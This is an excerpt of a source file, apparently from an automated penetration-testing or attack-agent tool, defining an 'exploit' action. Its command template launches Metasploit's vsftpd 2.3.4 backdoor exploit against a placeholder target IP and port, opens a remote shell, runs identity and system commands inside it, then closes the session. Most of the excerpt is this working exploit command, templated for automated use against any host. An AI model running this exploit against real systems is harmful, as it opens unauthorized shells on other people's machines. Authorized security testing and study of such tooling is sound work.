...
ACTIONS = {
    ...
    601: {
        ...
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; set RPORT {target_port}; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
        "placeholders": ["target_ip", "target_port"],        
        "parser_family": "msfconsole",
        "default_port": 21,
        "service_names": ["ftp", "vsftpd"],
        "expected_events": [
            "EXPLOIT_ATTEMPTED",
            "SESSION_OPENED",
        ...
        "risk_level": "high",
        "description": "Exploit vsftpd 2.3.4, create a background shell session, execute validation commands inside the remote shell, close the session and exit msfconsole.",
    },
